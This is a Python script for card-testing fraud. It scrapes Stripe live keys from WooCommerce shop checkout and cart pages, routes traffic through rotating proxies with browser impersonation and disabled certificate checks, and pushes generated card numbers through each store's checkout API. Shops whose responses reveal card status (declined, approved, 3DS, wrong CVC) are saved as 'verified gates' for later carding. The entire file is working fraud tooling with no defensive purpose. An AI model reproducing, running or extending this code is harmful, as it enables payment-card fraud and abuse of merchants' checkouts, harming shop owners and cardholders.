import asyncio
import json
import os
import sys
import time
import re

sys.path.insert(0, r"c:\Users\Redmi\Downloads\pusto")
sys.stdout.reconfigure(line_buffering=True, encoding="utf-8")

from curl_cffi.requests import AsyncSession
import config
import gate_client as gc

POOL_PATH = "data/scout_pool.json"
STORE_GATES_PATH = "data/store_gates.json"
SHOPIFY_GATES_PATH = "data/shopify_gates.json"

async def qualify_storegate(entry, sem):
    dom = entry["domain"]
    url = f"https://{dom}"
    cheap = entry.get("cheapest_cents") or 0
    pk = entry.get("stripe_pk") or ""
    
    async with sem:
        try:
            proxy = gc.pick_proxy(None, None)
            imp = config.pick_impersonate()
            async with AsyncSession(impersonate=imp, verify=False, proxy=proxy) as s:
                # If pk is missing, attempt quick resolution from /checkout/ or /cart/
                if not pk:
                    for pth in ("/checkout/", "/cart/"):
                        try:
                            r_chk = await s.get(f"{url}{pth}", timeout=8)
                            found_pk = gc.extract_pk_live(r_chk.text or "")
                            if found_pk:
                                pk = found_pk
                                break
                        except Exception:
                            pass

                print(f"[*] [StoreGate] Testing {dom} ({cheap}c, pk={bool(pk)})...")
                card = gc.gen_probe_card()
                card_raw = f"{card['number']}|{card['month']}|{card['year']}|{card['cvc']}"
                country = entry.get("geo", {}).get("country", "US")
                res = await gc.store_api_confirm(s, url, pk, card_raw,
                                                 country=country,
                                                 max_price_cents=3500)
                status = res.get("status")
                detail = res.get("detail", "")
                cents = res.get("amount_cents", cheap)
                print(f"    -> {dom}: {status} ({detail[:60]})")
                
                # Verified live if issuer rejected or required 3DS or approved
                if status in ("DECLINED", "APPROVED", "APPROVED@HOLD", "APPROVED@PAID",
                              "3DS_CHALLENGE", "3DS_METHOD", "INSUFFICIENT_FUNDS", "WRONG_CVC"):
                    return {
                        "domain": dom,
                        "base_url": url,
                        "pk_live": pk,
                        "gate_type": "woo_store_api",
                        "store_nonce": True,
                        "cheapest_cents": cents,
                        "updated_at": int(time.time()),
                        "status": "STORE_LIVE",
                        "verified": True,
                        "verify_status": status,
                        "verify_detail": detail[:200],
                        "phantom": False,
                        "phantom_probe": f"{status}: {detail[:80]}",
                        "dead_surface": False,
                        "battle_check": time.strftime("%Y-%m-%d"),
                        "battle_result": "LIVE"
                    }
        except Exception as e:
            print(f"    -> {dom}: EXC ({e})")
    return None

async def run_qualification():
    if not os.path.exists(POOL_PATH):
        print(f"Pool {POOL_PATH} not found.")
        return
    pool = json.load(open(POOL_PATH, "r", encoding="utf-8"))
    print(f"Loaded {len(pool)} entries from {POOL_PATH}")

    sg_data = json.load(open(STORE_GATES_PATH, "r", encoding="utf-8")) if os.path.exists(STORE_GATES_PATH) else []
    known_sg = {g["domain"] for g in sg_data if g.get("verified")}

    # Get all unverified StoreGate candidates
    sg_cands = [e for e in pool if "storegate" in e.get("routes", [])
                and e["domain"] not in known_sg
                and (e.get("cheapest_cents") is None or e.get("cheapest_cents") <= 3500)]
    print(f"StoreGate candidates to verify: {len(sg_cands)}")

    sem = asyncio.Semaphore(6)
    sg_tasks = [qualify_storegate(e, sem) for e in sg_cands]
    sg_results = await asyncio.gather(*sg_tasks)
    new_sg = [r for r in sg_results if r]

    if new_sg:
        for item in new_sg:
            sg_data.insert(0, item)
        with open(STORE_GATES_PATH, "w", encoding="utf-8") as f:
            json.dump(sg_data, f, indent=2, ensure_ascii=False)
        print(f"\n[+] Added {len(new_sg)} new verified StoreGate gates to {STORE_GATES_PATH}")

    print("\n--- QUALIFICATION SUMMARY ---")
    print(f"New verified StoreGate gates: {len(new_sg)} out of {len(sg_cands)}")
    for s in new_sg:
        print(f"  {s['domain']} - {s['cheapest_cents']}c ({s['verify_status']})")

if __name__ == "__main__":
    asyncio.run(run_qualification())
